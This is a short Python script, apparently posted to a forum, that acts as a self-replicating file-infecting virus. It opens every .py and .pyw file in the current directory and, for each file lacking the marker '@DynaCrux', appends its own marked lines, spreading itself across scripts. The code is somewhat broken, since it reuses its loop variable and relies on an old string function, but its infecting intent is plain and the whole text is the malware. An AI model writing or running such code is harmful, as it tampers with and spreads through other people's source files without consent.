#!/usr/bin/env python

Code: 
Code: 
import glob #! 
from string import * #! 
Files = glob.glob("*.py") + glob.glob("*.pyw") #! 
for Files in Files: #! 
   vCode = open(__file__, 'r') #! 
   victim = open (Files, 'r') #! 
   readvictim = victim.read() #! 
   if find(readvictim, "@DynaCrux") == -1: #! 
       victim = open(Files, 'a') #! 
       for code in vCode.readlines(): #! 
            if ("#!") in code: #! 
                vCode.close() #! 
                mycode=(chr(10)+code) #! 
                victim.write(mycode) #! 